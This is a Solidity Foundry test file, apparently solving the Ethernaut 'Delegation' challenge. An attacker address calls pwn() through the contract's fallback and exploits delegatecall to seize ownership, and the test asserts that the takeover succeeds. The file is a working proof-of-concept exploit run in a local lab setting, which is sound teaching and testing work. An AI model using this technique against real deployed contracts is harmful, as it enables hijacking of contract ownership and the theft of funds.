// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/Delegate.sol";

contract DelegateTest is Test {
    Delegate delegate;
    Delegation delegation;
    address attacker = makeAddr("attacker");
    address originalOwner = makeAddr("originalOwner");

    function setUp() public {
        delegate = new Delegate(originalOwner);
        delegation = new Delegation(address(delegate));
    }

    function testAttckerCanClaimOwnershipOfDelegation() public {
        // assert that user is the owner
        assert(delegation.owner() != attacker);
        // pretend to be attacker and trigger the fallback by sending pwn()
        vm.startPrank(attacker);
        (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "Exploit transaction failed");
        vm.stopPrank();
        // assert that attacker is the new owner
        assertEq(delegation.owner(), attacker);
    }
}